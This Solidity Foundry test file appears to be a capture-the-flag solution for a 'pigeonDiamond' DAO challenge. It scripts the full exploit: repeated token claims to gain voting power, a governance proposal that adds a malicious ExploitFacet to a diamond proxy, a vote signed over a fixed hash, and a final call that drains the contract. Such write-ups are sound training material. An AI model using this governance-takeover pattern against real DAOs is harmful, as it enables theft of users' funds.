// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./challenge/Setup.sol";
import "./Exploit.sol";

contract ExploitTest is Test {
    function test() public {
        (address playerAddress, uint256 playerKey) = makeAddrAndKey("player");
        Setup setup = new Setup{value: 3000 ether}();
        vm.deal(playerAddress, 10 ether);
        address pigeonDiamond = address(setup.pigeonDiamond());

        vm.roll(10);
        vm.startPrank(playerAddress, playerAddress);
        for (uint256 i = 0; i < 11; i++) {
            setup.claim();
        }
        FeatherCoinFacet(pigeonDiamond).delegate(playerAddress);
        ExploitFacet exploitFacet = new ExploitFacet();

        bytes4[] memory selectors = new bytes4[](1);
        selectors[0] = ExploitFacet.exploit.selector;
        uint256 proposalId = DAOFacet(pigeonDiamond).submitProposal(
            address(exploitFacet),
            "",
            IDiamondCut.FacetCut(address(exploitFacet), IDiamondCut.FacetCutAction.Add, selectors)
        );

        vm.roll(11);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerKey, keccak256("\x19Ethereum Signed Message:\n32"));
        bytes memory sig = abi.encodePacked(r, s, v);
        DAOFacet(pigeonDiamond).castVoteBySig(proposalId, true, sig);
        emit log_named_decimal_uint("ether", playerAddress.balance, 18);

        vm.roll(20);

        DAOFacet(pigeonDiamond).executeProposal(proposalId);

        vm.roll(21);
        ExploitFacet(pigeonDiamond).exploit();
        assertTrue(setup.isSolved());

        vm.stopPrank();
    }
}
